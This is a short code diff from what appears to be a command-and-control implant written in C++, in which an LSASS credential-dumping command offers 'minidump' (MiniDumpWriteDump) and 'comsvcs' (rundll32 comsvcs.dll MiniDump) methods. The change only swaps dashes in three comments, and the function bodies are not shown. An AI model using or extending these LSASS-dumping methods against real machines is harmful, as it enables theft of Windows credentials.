@@ -117,7 +117,7 @@ static auto declfn find_lsass_pid( instance& inst ) -> DWORD {
     return lsass_pid;
 }
 
-// method: minidump — uses MiniDumpWriteDump from dbghelp.dll
+// method: minidump - uses MiniDumpWriteDump from dbghelp.dll
 static auto declfn do_minidump(
     instance& inst,
     char* task_uuid,
@@ -192,7 +192,7 @@ static auto declfn do_minidump(
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
 
-// method: comsvcs — uses rundll32 comsvcs.dll MiniDump
+// method: comsvcs - uses rundll32 comsvcs.dll MiniDump
 static auto declfn do_comsvcs(
     instance& inst,
     char* task_uuid,
@@ -284,7 +284,7 @@ auto declfn starburst::cmd_lsass_dump(
     char method[32] = { 0 };
     memory::copy( method, method_str, method_len < 31 ? method_len : 31 );
 
-    // build dump path — use provided or default to temp dir
+    // build dump path - use provided or default to temp dir
     char dump_path[280] = { 0 };
     if ( path_str && path_len > 0 ) {
         memory::copy( dump_path, path_str, path_len < 270 ? path_len : 270 );
